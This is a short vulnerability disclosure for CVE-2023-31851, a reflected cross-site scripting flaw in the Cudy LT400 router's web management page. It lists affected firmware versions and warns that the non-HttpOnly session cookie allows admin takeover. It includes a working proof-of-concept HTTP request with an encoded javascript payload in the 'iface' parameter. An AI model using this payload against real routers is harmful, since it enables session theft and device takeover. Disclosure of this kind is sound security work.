# CVE-2023-31851

Reflected cross-site scripting (XSS) attack exists in web-based management interface of Cudy LT400. 

The page `/cgi-bin/luci/admin/network/wireless/status` has reflected XSS via the `iface` parameter.

The methods of exploitation would involve sending a specially crafted request to the victim that includes malicious code.

**The affected application does not set the Session Cookie with the HttpOnly attribute; this can result in admin takeover via session token theft.**

Vulnerable firmware versions: 1.13.4 - 1.15.18 - 1.15.27

## PoC

```
GET /cgi-bin/luci/admin/network/wireless/status?iface=wlan00%22%29%27%20href%3D%22javascript%3Aalert%28document.cookie%29%3B%22%3Exss%3C%2Fa%3E HTTP/1.1
Host: 172.16.1.1
User-Agent: Mozilla/5.0
Accept: text/html, */*; q=0.01
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://172.16.1.1/cgi-bin/luci/
Cookie: sysauth=REDACTED
```

## Vendor

Shenzhen Cudy Technology

## CVE Reference

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-31851

## Product Reference

https://www.cudy.com
